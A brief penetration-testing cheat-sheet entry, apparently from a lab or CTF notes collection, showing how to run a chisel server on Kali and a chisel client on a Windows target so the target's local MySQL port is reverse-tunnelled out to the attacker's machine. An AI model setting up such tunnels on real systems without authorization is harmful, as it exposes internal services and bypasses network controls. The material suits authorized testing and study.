## Windows - Service Tunneling

in order to forward a service from Windows target machine to our Kali:


on Kali machine:

```bash
sudo apt install chisel -y
chisel server -p 8000 --reverse
```


On Windows target machine:


```powershell
.\chisel.exe client <kali_ip>:8000 R:3306:127.0.0.1:3306
```
